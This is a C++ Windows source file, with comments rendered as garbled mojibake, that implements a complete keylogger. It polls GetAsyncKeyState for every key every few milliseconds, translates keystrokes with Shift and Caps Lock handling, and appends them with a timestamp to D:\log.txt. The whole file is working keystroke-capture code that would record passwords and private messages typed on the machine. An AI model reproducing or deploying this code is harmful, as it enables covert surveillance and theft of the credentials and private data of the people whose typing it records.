#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
#include <ctime>
using namespace std;
// ʱ�䣬�ṹ��
struct Time{
    int year;
    int month;
    int day;
    int hour;
    int minite;
};
// ��int��������ת����string����
string intToString(int intData) {
    char buf[5];
    sprintf(buf,"%d",intData);
    string s = buf;
    return s;
}

Time getCurrentTime()
{
    time_t timer;
    time(&timer);
    tm* t_tm = localtime(&timer);

    //cout<<"today is "<<t_tm->tm_year+1900<<" "<<t_tm->tm_mon+1<<" "<<t_tm->tm_mday<<endl;
    Time t;
    t.year = t_tm->tm_year+1900;
    t.month = t_tm->tm_mon+1;
    t.day = t_tm->tm_mday;
    t.hour = t_tm->tm_hour;
    t.minite = t_tm->tm_min;
    return t;
}
string GetKey(int Key) // �жϼ��̰���ʲô��
{
string KeyString = "";
//�жϷ�������
const int KeyPressMask=0x80000000; //�������볣��
int iShift=GetKeyState(0x10); //�ж�Shift��״̬
bool IS=(iShift & KeyPressMask)==KeyPressMask; //��ʾ����Shift��
if(Key >=186 && Key <=222)
{
switch(Key)
{
case 186:
if(IS)
KeyString = ":";
else
KeyString = ";";
break;
case 187:
if(IS)
KeyString = "+";
else
KeyString = "=";
break;
case 188:
if(IS)
KeyString = "<";
else
KeyString = ",";
break;
case 189:
if(IS)
KeyString = "_";
else
KeyString = "-";
break;
case 190:
if(IS)
KeyString = ">";
else
KeyString = ".";
break;
case 191:
if(IS)
KeyString = "?";
else
KeyString = "/";
break;
case 192:
if(IS)
KeyString = "~";
else
KeyString = "`";
break;
case 219:
if(IS)
KeyString = "{";
else
KeyString = "[";
break;
case 220:
if(IS)
KeyString = "|";
else
KeyString = "\\";
break;
case 221:
if(IS)
KeyString = "}";
else
KeyString = "]";
break;
case 222:
if(IS)
KeyString = '"';
else
KeyString = "'";
break;
}
}
//�жϼ��̵ĵ�һ��
if (Key == VK_ESCAPE) // �˳�
KeyString = "[Esc]";
else if (Key == VK_F1) // F1��F12
KeyString = "[F1]";
else if (Key == VK_F2)
KeyString = "[F2]";
else if (Key == VK_F3)
KeyString = "[F3]";
else if (Key == VK_F4)
KeyString = "[F4]";
else if (Key == VK_F5)
KeyString = "[F5]";
else if (Key == VK_F6)
KeyString = "[F6]";
else if (Key == VK_F7)
KeyString = "[F7]";
else if (Key == VK_F8)
KeyString = "[F8]";
else if (Key == VK_F9)
KeyString = "[F9]";
else if (Key == VK_F10)
KeyString = "[F10]";
else if (Key == VK_F11)
KeyString = "[F11]";
else if (Key == VK_F12)
KeyString = "[F12]";
else if (Key == VK_SNAPSHOT) // ��ӡ��Ļ
KeyString = "[PrScrn]";
else if (Key == VK_SCROLL) // ��������
KeyString = "[Scroll Lock]";
else if (Key == VK_PAUSE) // ��ͣ���ж�
KeyString = "[Pause]";
else if (Key == VK_CAPITAL) // ��д����
KeyString = "[Caps Lock]";

//-------------------------------------//
//���Ƽ�
else if (Key == 8) //<- �ظ��
KeyString = "[Backspace]";
else if (Key == VK_RETURN) // �س���������
KeyString = "[Enter]\n";
else if (Key == VK_SPACE) // �ո�
KeyString = " ";
//�ϵ���:���̼�¼��ʱ�򣬿��Բ���¼��������Shift�ǲ������κ��ַ���
//�ϵ����ͱ�ļ���ϣ����ʱ���ַ����
/*
else if (Key == VK_LSHIFT) // ����ϵ���
KeyString = "[Shift]";
else if (Key == VK_LSHIFT) // �Ҳ��ϵ���
KeyString = "[SHIFT]";
*/
/*���ֻ�ǶԼ����������ĸ���м�¼:���Բ������¼�������ļ�*/
else if (Key == VK_TAB) // �Ʊ���
KeyString = "[Tab]";
else if (Key == VK_LCONTROL) // ����Ƽ�
KeyString = "[Ctrl]";
else if (Key == VK_RCONTROL) // �ҿ��Ƽ�
KeyString = "[CTRL]";
else if (Key == VK_LMENU) // �󻻵���
KeyString = "[Alt]";
else if (Key == VK_LMENU) // �һ�����
KeyString = "[ALT]";
else if (Key == VK_LWIN) // �� WINDOWS ��
KeyString = "[Win]";
else if (Key == VK_RWIN) // �� WINDOWS ��
KeyString = "[WIN]";
else if (Key == VK_APPS) // ������ �Ҽ�
KeyString = "�Ҽ�";
else if (Key == VK_INSERT) // ����
KeyString = "[Insert]";
else if (Key == VK_DELETE) // ɾ��
KeyString = "[Delete]";
else if (Key == VK_HOME) // ��ʼ
KeyString = "[Home]";
else if (Key == VK_END) // ����
KeyString = "[End]";
else if (Key == VK_PRIOR) // ��һҳ
KeyString = "[PgUp]";
else if (Key == VK_NEXT) // ��һҳ
KeyString = "[PgDown]";
// �����õļ�����:һ�����û��
else if (Key == VK_CANCEL) // Cancel
KeyString = "[Cancel]";
else if (Key == VK_CLEAR) // Clear
KeyString = "[Clear]";
else if (Key == VK_SELECT) //Select
KeyString = "[Select]";
else if (Key == VK_PRINT) //Print
KeyString = "[Print]";
else if (Key == VK_EXECUTE) //Execute
KeyString = "[Execute]";

//----------------------------------------//
else if (Key == VK_LEFT) //�ϡ��¡����Ҽ�
KeyString = "[��]";
else if (Key == VK_RIGHT)
KeyString = "[��]";
else if (Key == VK_UP)
KeyString = "[��]";
else if (Key == VK_DOWN)
KeyString = "[��]";
else if (Key == VK_NUMLOCK)//С������������
KeyString = "[NumLock]";
else if (Key == VK_ADD) // �ӡ������ˡ���
KeyString = "+";
else if (Key == VK_SUBTRACT)
KeyString = "-";
else if (Key == VK_MULTIPLY)
KeyString = "*";
else if (Key == VK_DIVIDE)
KeyString = "/";
else if (Key == 190 || Key == 110) // С���� . ������ .
KeyString = ".";
//С�������ּ�:0-9
else if (Key == VK_NUMPAD0)
KeyString = "0";
else if (Key == VK_NUMPAD1)
KeyString = "1";
else if (Key == VK_NUMPAD2)
KeyString = "2";
else if (Key == VK_NUMPAD3)
KeyString = "3";
else if (Key == VK_NUMPAD4)
KeyString = "4";
else if (Key == VK_NUMPAD5)
KeyString = "5";
else if (Key == VK_NUMPAD6)
KeyString = "6";
else if (Key == VK_NUMPAD7)
KeyString = "7";
else if (Key == VK_NUMPAD8)
KeyString = "8";
else if (Key == VK_NUMPAD9)
KeyString = "9";
//-------------------------------------------//

//-------------------------------------------//
//*����ĸ�Ĵ�Сд�����ж�*//
else if (Key >=97 && Key <= 122) // ��ĸ:a-z
{
if (GetKeyState(VK_CAPITAL)) // ��д����
{
if(IS) //Shift����:ΪСд��ĸ
KeyString = Key;
else // ֻ�д�д����:�����д��ĸ
KeyString = Key - 32;
}
else// ��дû������
{
if(IS) // ����Shift��: ��д��ĸ
KeyString = Key - 32;
else // û�а�Shift��: Сд��ĸ
KeyString = Key;
}
}
else if (Key >=48 && Key <= 57) // ��������:0-9���Ϸ��ķ���
{
if(IS)
{
switch(Key)
{
case 48: //0
KeyString = ")";
break;
case 49://1
KeyString = "!";
break;
case 50://2
KeyString = "@";
break;
case 51://3
KeyString = "#";
break;
case 52://4
KeyString = "$";
break;
case 53://5
KeyString = "%";
break;
case 54://6
KeyString = "^";
break;
case 55://7
KeyString = "&";
break;
case 56://8
KeyString = "*";
break;
case 57://9
KeyString = "(";
break;
}
}
else
KeyString = Key;
}
if (Key != VK_LBUTTON || Key != VK_RBUTTON)
{
if (Key >=65 && Key <=90) //ASCII 65-90 ΪA-Z
{
if (GetKeyState(VK_CAPITAL)) // ��д����:���A-Z
{
if(IS) // ��д���������Ұ����ϵ���:���ΪСд��ĸ
KeyString = Key + 32;
else //ֻ�д�д����:���Ϊ��д��ĸ
KeyString = Key;
}
else // ��дû������:a-z
{
if(IS)
{
KeyString = Key;
}
else
{
Key = Key + 32;
KeyString = Key;
}
}
}
}

return KeyString;
}

int main()
{
    string FilePath = "D:\\log.txt";//������¼�ı�����D��log.txtĿ¼��
    string TempString = "";
    fstream FStream;
    FStream.open(FilePath.c_str(), std::fstream::out | std::fstream::app);

    Time t =  getCurrentTime();
    string startAt;
    startAt.append("\n--------------- ��ʼ��¼ʱ�䣺").append( intToString(t.year).c_str() )
                                    .append("-").append( intToString(t.month).c_str() )
                                    .append("-").append( intToString(t.day).c_str() )
                                    .append(" * ").append( intToString(t.hour).c_str() )
                                    .append(":").append( intToString(t.minite).c_str() )
                                    .append(" ---------------\n\n");
    FStream.write(startAt.c_str(), startAt.size());
    //�˴��ر��ļ��ִ��ļ���Ҫԭ����д�ļ���ʱ����ڻ������⣬������δ���򲻻Ὣ����д���ļ������Ƕ��ļ����йرղ�����
    FStream.close();
    FStream.open(FilePath.c_str(), std::fstream::out | std::fstream::app);
    while(true)
    {
        Sleep(5);
        // �����еļ����б������ҵ������µļ�
        for(int key = 8; key <=255; key++)
        {
            if(GetAsyncKeyState(key)&1 ==1)     // �ж�keyֵ��Ӧ�ļ���ǰ״̬
            {
                TempString = GetKey(key);
                FStream.write(TempString.c_str(), TempString.size());
                FStream.close();
                FStream.open(FilePath.c_str(), std::fstream::out | std::fstream::app);
            }
        }
    }
    return 0;
}